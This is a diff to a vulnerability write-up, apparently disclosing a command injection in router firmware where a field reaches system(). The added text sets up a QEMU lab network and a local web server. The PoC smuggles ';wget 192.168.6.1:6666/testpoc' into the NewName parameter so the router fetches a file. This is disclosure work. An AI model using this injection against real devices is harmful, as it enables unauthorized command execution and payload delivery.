@@ -37,6 +37,23 @@ Finally,the command will be executed by  system() in sub_404850
 
 ## Proof of Concept (PoC)
 
+
+Before starting the proof of concept (POC) verification, execute the following commands in the Ubuntu terminal:
+
+`ip tuntap add dev tap0 mode tap`
+
+`ip addr add 192.168.6.1/24 dev tap0`
+
+`ip link set tap0 up`
+
+`touch  testpoc`
+
+`python3 -m  http.server  6666`
+
+And within the QEMU virtual machine, run: `ifconfig eth0 192.168.6.2/24 up`
+
+
+
 We set `NewName` as **;wget 192.168.6.1:6666/testpoc** , and the router will execute it,such as:
 
 ```http
@@ -58,6 +75,7 @@ page=SetName&macname=&flag=&NewName=;wget 192.168.6.1:6666/testpoc
 ## Result
 
 <div  align="center"><img src="./img/poc.png" style="zoom:80%;" /></div>
+
 
 
 
